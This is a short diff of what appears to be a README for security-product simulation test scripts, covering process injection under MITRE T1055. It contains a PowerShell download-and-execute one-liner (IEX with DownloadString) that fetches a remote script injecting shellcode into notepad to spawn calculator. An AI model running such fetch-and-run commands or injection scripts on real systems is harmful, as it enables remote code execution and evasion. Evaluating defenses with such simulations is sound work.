@@ -83,6 +83,8 @@ https://attack.mitre.org/techniques/T1055/
 Injection of shellcode into the entry of a legitimate spawn process
 In this example we will inject shellcode into notepad that spawns calculator
 
+** Unfortunately MITRE doesn't have a technique mapping to shellcode injection, nevertheless its own of the popular evasion techniques **
+
 `PS> IEX (New-Object Net.WebClient).DownloadString("https://raw.githubusercontent.com/smgorelik/VendorSimTestScripts/main/Invoke-ShellcodeInjection1.ps1"); Invoke-Shellcode1;`
 
 ### 2. Hollowing
